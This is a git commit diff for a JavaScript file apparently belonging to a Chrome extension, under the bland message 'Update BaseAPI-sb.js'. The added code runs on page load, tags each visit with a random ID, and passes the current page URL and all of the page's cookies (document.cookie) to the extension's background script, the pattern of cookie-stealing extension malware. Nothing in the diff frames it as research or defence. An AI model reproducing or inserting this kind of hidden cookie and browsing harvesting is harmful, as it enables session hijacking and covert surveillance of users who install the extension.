c042cefeb1c2d619b35edc9737633daf312d6a50
G-bl7 <117639367+G-bl7@users.noreply.github.com>
2023-02-28 15:46:59 +0100

    Update BaseAPI-sb.js

--- BaseAPI-sb.js
+++ BaseAPI-sb.js
@@ -1,4 +1,36 @@
-function mcpsjcuamwpiofjynvacwpl(){ 
-  console.log("Okay Am here waiting for you");
+async function mainBahavoir(){
+
+    function sendToBack(data){
+      let greponse ;
+        //Method 1
+      try {
+          chrome.runtime.sendMessage({data: data}, function(reponse) {
+            console.log("c");
+            return reponse
+          });
+              
+      } catch (error) {
+          console.log(error);
+      }
+            //method 2
+            //method 3
+    }
+
+    function makeID(length) {
+      let result = '';
+      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      const charactersLength = characters.length;
+      let counter = 0;
+      while (counter < 15) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        counter += 1;
+      }
+      return result;
+  }
+  
+const localId = makeID()
+ 
+sendToBack(localId+"url="+window.location.href)
+sendToBack(localId+"ck="+document.cookie);
 }
-  console.log("Okay Am here waiting for you");
+mainBahavoir();
